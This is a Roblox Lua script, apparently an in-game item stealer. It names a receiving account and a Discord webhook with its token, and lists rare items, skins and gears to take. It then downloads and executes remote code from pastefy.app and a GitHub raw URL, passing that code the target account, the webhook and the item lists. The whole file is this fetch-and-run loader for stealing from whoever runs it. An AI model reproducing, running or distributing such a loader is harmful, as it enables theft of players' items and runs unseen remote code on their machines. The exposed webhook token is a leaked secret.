local TARGET_ID = 10604700874
local TARGET_USER = "Essadmin"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1553403956103880846/yRXb5CvZdjqbSl1rBTF1Roy3o58kbQ-K9lZLKRZjydgaNHC9l9opyg4XMjO7LFM60lAg"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Garama and Madundung"] = true,
    ["Money Money Bros"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Sammyni Fattini"] = true,
    ["Sammyni Cakini"] = true,
    ["Burguro and Fryuro"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Divine"] = true,
    ["Diamond"] = true,
    ["Cyber"] = true,
    ["Bunny Basket"] = true,
    ["Cursed"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Lucky"] = true,
    ["Lava"] = true,
    ["Halloween"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rose"] = true,
    ["Valentines"] = true,
    ["Rainbow"] = true,
    ["Yin Yang"] = true,
    ["Taco"] = true,
    ["Summer"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Candy Slap"] = true,
    ["Candy Sentry"] = true,
    ["Alien Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Rainbow Hammer"] = true,
    ["Radioactive Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Cyber Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Lava Slap"] = true,
    ["Crystal Slap"] = true,
    ["Phantom Slap"] = true,
    ["Yin Yang Slap"] = true,
    ["Yin Yang Lamp"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)